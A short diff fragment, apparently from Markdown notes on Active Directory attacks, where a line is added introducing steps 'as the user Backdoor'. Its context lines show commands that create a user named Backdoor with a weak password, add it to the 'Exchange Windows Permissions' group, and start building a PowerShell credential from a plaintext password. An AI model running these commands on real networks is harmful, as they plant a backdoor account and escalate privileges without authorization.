@@ -128,6 +128,7 @@ net user Backdoor Password1 /add
 net group "Exchange Windows Permissions" Backdoor /add
 ```
 
+As the user `Backdoor`:
 ```
 $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
 
